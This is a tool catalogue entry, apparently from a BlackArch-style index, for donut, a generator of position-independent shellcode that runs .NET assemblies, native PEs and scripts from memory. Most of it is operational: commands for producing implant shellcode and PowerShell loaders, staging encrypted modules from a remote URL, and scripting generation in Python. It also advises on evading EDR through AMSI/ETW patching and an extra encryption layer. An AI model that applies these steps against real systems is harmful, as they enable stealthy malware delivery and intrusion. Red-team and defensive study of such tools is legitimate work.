---
name: "donut"
categories:
  - blackarch-backdoor
version: "529.47758d7"
homepage: "https://github.com/TheWover/donut"
packaged-by: [blackarch, aur]
blackarch-builddate: "2026-01-12"
build-system: python
license: BSD
meta-checked: "2026-11-09"
github-repo: "TheWover/donut"
github-stars: 4749
github-pushed: "2025-07-08"
github-archived: false
github-issues: 36
github-match: "exact"
gh-checked: "2026-11-07"
worth: 4.7
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# donut

> Turn .NET assemblies, native PEs and VBScript/JScript into position-independent shellcode that executes them from memory.

## What it's for

Donut converts an input file — a .NET EXE/DLL assembly, a native (unmanaged) PE, or a VBScript/JScript file — into a single blob of position-independent shellcode that loads and runs it entirely in memory: .NET via the unmanaged CLR hosting API and disposable AppDomains, native PEs via a custom loader (relocations required, Cygwin builds unsupported), scripts via IActiveScript. The module can be embedded in the loader or staged from an HTTP URL, and can be compressed (aPLib, LZNT1, Xpress, Xpress Huffman), encrypted with a random 128-bit Chaskey key, and delivered with AMSI/WLDP/ETW patching, entropy-generated names, PE-header overwriting and module overloading via a decoy DLL. Output formats include raw, Base64, C, Ruby, Python, PowerShell, C# and hex, so it drops straight into loaders, loaders/injectors and script toolchains. Know its limits: .NET assemblies need public static entry points taking only strings (no mixed-mode assemblies), and the generated loader stub is well-known to defenders — its CLR bootstrap prologue is byte-pattern matched by EDR, so in detection-heavy environments treat donut output as a base for a further obfuscation layer (e.g. encrypt the shellcode and decrypt it inside a custom runner) rather than as final payload.

## Typical use cases

### Convert a .NET assembly to raw shellcode

Produce implant shellcode from a tool assembly.

```
donut tool.exe
```

Outcome: writes `loader.bin` — raw, dual-architecture (x86+AMD64, the default `-a 3`) position-independent shellcode that hosts the CLR and runs the assembly when executed in any Windows process. This raw x86/x64 output is the standard input to custom runners, injectors and encrypted-loader pipelines.

### Emit a script-language format instead of raw

Get a paste-ready loader for script toolchains.

```
donut tool.exe -f 6 -o tool.ps1
```

Outcome: `-f` selects the output format (1=raw, 2=Base64, 3=C, 4=Ruby, 5=Python, 6=PowerShell, 7=C#, 8=hex); here the same module lands in `tool.ps1` as PowerShell ready to dot-source or hand to a script-delivery chain.

### Invoke a specific .NET DLL method

Run an assembly DLL rather than an EXE entry point.

```
donut library.dll -c Namespace.ClassName -m MethodName -p "arg1 arg2"
```

Outcome: shellcode that creates a disposable AppDomain, loads `library.dll`, and invokes `MethodName` on `Namespace.ClassName` with the quoted parameters (`-c` class and `-m` method are required for .NET DLLs).

### Stage the module over HTTP

Keep the payload body off the initial stager.

```
donut tool.exe -s https://example.com/stage -n module
```

Outcome: instead of embedding the module, the loader downloads the encrypted donut module from the staging URL at runtime (credentials in `https://user:pass@example.com/` form are accepted; `-n` sets the module name); host the generated module file at that path on your server.

### Generate shellcode programmatically from Python

Build donut into your own generator pipeline.

```
python3 -c "import donut; open('loader.bin','wb').write(donut.create(file='tool.exe', arch=3, bypass=3, params='arg1 arg2'))"
```

Outcome: the `donut` Python module's single `create()` function returns the raw shellcode bytes (same parameters as the CLI), here written straight to `loader.bin` — the natural hook for scripted chains that post-process the output, e.g. XOR- or AES-encrypting the blob before handing it to a custom decrypting runner.

*Corpus evidence: 9 mentions across 1 machine(s) — Python `donut.create()` for raw x86/x64 shellcode feeding encrypted-loader pipelines.*
